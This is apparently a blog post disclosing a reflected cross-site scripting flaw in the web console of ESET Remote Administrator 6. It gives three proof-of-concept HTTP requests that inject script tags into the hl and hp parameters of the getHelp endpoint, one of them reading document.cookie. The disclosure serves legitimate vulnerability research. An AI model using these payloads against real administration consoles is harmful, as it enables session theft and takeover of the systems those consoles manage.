---
layout: post
title:  "Cross-Site Scripting (XSS) in ESET Remote Administrator"
date:   2019-01-21 03:43:45 +0700
categories: [cve]
---
I found that XSS vulnerabilities during the pentest back in 2016, but never reported it to the vendor. According to exloit-db.com/search or cxsecurity.com/search this has never been reported, so I'm catching up now in 2019 with old stuff.
cvedetails.com websites doesn't mention it https://www.cvedetails.com/vulnerability-list/vendor_id-8861/product_id-16877/Eset-Remote-Administrator.html. It appears, that issue might have been internally patched.
Mitre website also mentioned only one XSS back from 2009, see https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Eset+Remote+Administrator

Unfortunatelly, all evidences except a single txt file went gone during the issue with my MS Windows testing vmware image a year or more ago, where I installed a local version of "All-In-One ERA 6".

Vendor: ESET, LLC, d/b/a ESET North America
Product: ESET Remote Administrator
Version affected: 6

#### Product description:
ESET Remote Administrator allows to oversee the entire network, including workstations, servers and smartphones from a single point. It can be installed on Windows as well as Linux servers and also comes as a Virtual Appliance. It handles
communication with agents, and collects and stores application data in the database.

#### Cross-Site Scripting, Reflected
* CVE: CVE-2019-xxxx
* CWE: CWE-79


A Cross Site Scripting vulnerability exists in ESET Remote Administrator hl, hp parameters. It is possible to inject arbitrary JavaScript into requests which are ultimately executed by the user browser.


## Proof of Concept 1
{% highlight ruby %}
GET /era/webconsole/getHelp?hl=en-US&hp=fs_login_screen.htm"/><script>alert(document.cookie)</script> HTTP/1.1
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: a.b.c.d
Connection: Keep-Alive
Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
{% endhighlight %}

## Proof of Concept 2
{% highlight ruby %}
GET /era/webconsole/getHelp?hl=en-US"/><script>alert('xss')</script>&hp=fs_login_screen.htm HTTP/1.1
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: a.b.c.d
Connection: Keep-Alive
Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
{% endhighlight %}

## Proof of Concept 3
{% highlight ruby %}
GET /era/webconsole/getHelp?hl="><script>alert('xss')</script> HTTP/1.1
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: a.b.c.d
Connection: Keep-Alive
Cookie: JSESSIONID=02EB9FB09F74291DF91AE98411F9ECAF
{% endhighlight %}

#### References:
1. OWASP - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
2. Vendor website - https://www.eset.com/au/business/remote-management/remote-administrator/
3. Download the latest trial version - https://support.eset.com/kb6114/?locale=en_US&viewlocale=en_US
